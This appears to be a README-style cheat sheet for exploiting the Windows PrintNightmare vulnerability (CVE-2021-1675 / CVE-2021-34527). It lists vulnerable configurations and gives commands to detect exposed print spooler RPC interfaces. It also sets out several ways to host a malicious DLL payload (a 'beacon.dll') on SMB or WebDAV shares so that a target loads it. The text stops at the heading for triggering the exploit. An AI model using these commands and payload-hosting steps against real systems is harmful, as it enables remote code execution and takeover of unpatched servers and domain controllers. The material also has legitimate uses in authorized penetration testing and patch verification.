# Print Nightmare CVE-2021-1675 / CVE-2021-34527

### The DLL will be stored in C:\Windows\System32\spool\drivers\x64\3\ . The exploit will execute the DLL either from the local filesystem or a remote share.

## Requirements:

 - Spooler Service enabled (MANDATORY)

 - Server with patches < June 2021

 - DC with Pre Windows 2000 Compatiblity group

 - Server with registry key HKEY_CURRENT_USER\Software\Policies\Microsoft\Windows NT\Printers\PointAndPrint\NoWarningNoElevationOnInstall = (DWORD) 1

 - Server with registry key HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableLUA = (DWORD) 0

## Detect the vulnerability:

#### 1) Impacket rpcdump

 - python3 ./rpcdump.py @10.0.2.10 | egrep 'MS-RPRN|MS-PAR'

#### 2) It Was All A Dream (Github repo: https://github.com/byt3bl33d3r/ItWasAllADream)

 - git clone https://github.com/byt3bl33d3r/ItWasAllADream

 - cd ItWasAllADream && poetry install && poetry shell

 - itwasalladream -u user -p Password123 -d domain 10.10.10.10/24

### OR

 - docker run -it itwasalladream -u username -p Password123 -d domain 10.10.10.10

## Payload Hosting:

#### 1) The payload can be hosted on Impacket SMB Server since PR #1109:

 - python3 ./smbserver.py share /tmp/smb/

#### 2) Using Invoke-BuildAnonymousSMBServer (Admin rights required on host):

 - Import-Module .\Invoke-BuildAnonymousSMBServer.ps1; Invoke-BuildAnonymousSMBServer

#### 3) Using WebDav with SharpWebServer (Doesn't require admin rights):

 - SharpWebServer.exe port=8888 dir=c:\users\public verbose=true

### When using WebDav instead of SMB, you must add @[PORT] to the hostname in the URI, e.g.: \\172.16.1.5@8888\Downloads\beacon.dll WebDav client must be activated on exploited target. By default it is not activated on Windows workstations (you have to net start webclient ) and it's not installed on servers. Here is how to detect activated webdav:

 - cme smb -u user -p password -d domain.local -M webdav [TARGET]

## Trigger the exploit

#### 1) SharpNightmare
